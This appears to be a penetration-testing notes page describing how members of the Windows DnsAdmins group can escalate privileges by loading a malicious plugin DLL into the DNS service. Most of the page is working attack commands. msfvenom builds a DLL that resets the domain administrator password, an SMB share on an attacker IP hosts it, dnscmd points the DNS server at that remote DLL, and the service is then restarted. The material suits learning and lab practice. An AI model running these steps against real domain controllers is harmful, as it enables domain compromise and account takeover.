# DnsAdmins

## Information

This membership can be exploited by performing a **DLL injection**, i.e. specifying a plugin DLL that can be loaded upon (re)starting the DNS service.

## Exploitation

### Admin Password

Generate a malicious DLL and [transfer it](../../../tools/file-transfers.md) to the target.

{% hint style="danger" %}
Passing any payload this way **crashes the DNS server** as it never really starts. More information on how to bypass this issue by executing the payload as a thread [here](https://youtu.be/8KJebvmd1Fk?t=3034).
{% endhint %}

{% code overflow="wrap" %}
```bash
# generating the payload
sudo msfvenom -p windows/x64/exec cmd='net user administrator Password123! /domain' -f dll > da.dll
# starting an SMB server
$ impacket-smbserver -smb2support share ./
```
{% endcode %}

Set the DLL path from the compromised host and restart the DNS service (DnsAdmins cannot restart services by default, but it not uncommon to be given that right).

{% code overflow="wrap" %}
```powershell
# setting the Windows Registry remote DLL path
dnscmd.exe [FQDN] /config /serverlevelplugindll \\10.10.14.3\share\da.dll
```
{% endcode %}

Restart the DNS service. `DnsAdmins` members cannot restart services by default using `sc`, but they can do it with `dnscmd`.

{% tabs %}
{% tab title="dnscmd" %}
```powershell
dnscmd [FQDN] /restart
```
{% endtab %}

{% tab title="sc" %}
```powershell
# stop service
sc.exe stop dns
# start service
sc.exe start dns
```
{% endtab %}
{% endtabs %}

For an example of the above process check [here](https://x7331.gitbook.io/boxes/boxes/boxes/medium/resolute#elevation-of-privileges).

## Resources

{% tabs %}
{% tab title="Exploitation" %}
{% embed url="https://adsecurity.org/?p=4064" %}
{% endtab %}

{% tab title="DnsAdmins In-depth" %}
{% embed url="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83" %}
{% endtab %}
{% endtabs %}
